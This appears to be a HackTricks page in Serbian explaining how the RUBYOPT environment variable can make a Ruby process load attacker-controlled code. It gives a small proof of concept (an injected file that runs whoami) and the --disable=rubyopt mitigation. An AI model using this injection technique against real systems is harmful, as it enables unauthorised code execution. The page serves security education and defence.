# Injekcija Ruby aplikacija

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby parsira podržane prekidače komandne linije iz promenljive okruženja `RUBYOPT` pre pokretanja skripte. Iako Ruby tamo odbacuje neke prekidače, `-I` može dodati direktorijum za pretragu biblioteka, a `-r` može zahtevati biblioteku. Proces koji pokreće Ruby sa promenljivama okruženja pod kontrolom napadača zato može biti primoran da učita Ruby kod pod kontrolom napadača.<sup>[[1]](#references)</sup>

Kreirajte `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Kreirajte bezopasnu Ruby skriptu kao što je `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Pokrenite ga sa kontrolisanom vrednošću `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Da biste onemogućili ovo ponašanje, prosledite `--disable=rubyopt` (ili `--disable-rubyopt`) **pre** imena skripte:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Opcija napisana nakon `hello.rb` prosleđuje se skripti u `ARGV`; ona ne onemogućava prethodnu Ruby obradu promenljive `RUBYOPT`.<sup>[[1]](#references)</sup>

## References

- [1] [Ruby dokumentacija - Ruby opcije komandne linije](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
